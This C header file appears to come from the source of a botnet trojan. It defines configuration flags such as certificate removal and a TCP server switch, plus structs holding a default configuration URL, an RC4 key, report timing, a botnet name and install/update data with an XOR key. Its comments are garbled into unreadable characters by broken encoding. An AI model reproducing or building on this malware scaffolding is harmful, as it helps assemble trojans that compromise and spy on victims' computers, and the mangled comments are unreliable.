#pragma once

//Autogenerated file!

enum
{
  BCF_03                = 0x00000001,
  BCF_26                = 0x00000002,
  BCF_19                = 0x00000004,
  BCF_12                = 0x00000008,
  BCF_11                = 0x00000010,
  BCF_15                = 0x00000020,
  BCF_10                = 0x00000040,
  BCF_13                = 0x00000080,
  BCF_08                = 0x00000100,
  BCF_18                = 0x00000200,
  BCF_REMOVE_CERTS      = 0x00000400,
  BCF_05                = 0x00000800,
  BCF_02                = 0x00001000,
  BCF_23                = 0x00002000,
  BCF_25                = 0x00004000,
  BCF_04                = 0x00008000,
  BCF_27                = 0x00010000,
  BCF_09                = 0x00020000,
  BCF_16                = 0x00040000,
  BCF_01                = 0x00080000,
  BCF_28                = 0x00100000,
  BCF_14                = 0x00200000,
  BCF_29                = 0x00400000,
  BCF_21                = 0x00800000,
  BCF_06                = 0x01000000,
  BCF_17                = 0x02000000,
  BCF_DISABLE_TCPSERVER = 0x04000000,
  BCF_30                = 0x08000000,
  BCF_22                = 0x10000000,
  BCF_24                = 0x20000000,
  BCF_20                = 0x40000000,
  BCF_07                = 0x80000000
};

typedef struct
{
  BYTE  padding0[56];
  DWORD flags;                               //����� BCF_*.
  BYTE  padding1[8];
  DWORD delayStats;                          //������ �������� ��� �������� ����������.
  BYTE  padding2[53];
  DWORD delayReport;                         //������ �������� ��� �������� �������.
  BYTE  padding3[79];
  char  defaultConfig[100 + 1];              //URL ������������ �� ���������.
  BYTE  padding4[71];
  Crypt::RC4KEY baseKey;                     //���� ���������� �������.
  BYTE  padding5[11];
  DWORD delayConfig;                         //������ �������� ��� �������� ������������.
  BYTE  padding6[32];
  WCHAR defaultBotnet[BOTNET_MAX_CHARS + 1]; //��� ������� �� ���������.
  BYTE  padding7[55];
}BASECONFIG;

typedef struct
{
  DWORD installSize; //������ CoreInstall::_install().
  DWORD updateSize;  //������ CoreInstall::_update().
  DWORD xorKey;      //���� ����������.
}INSTALLDATA;
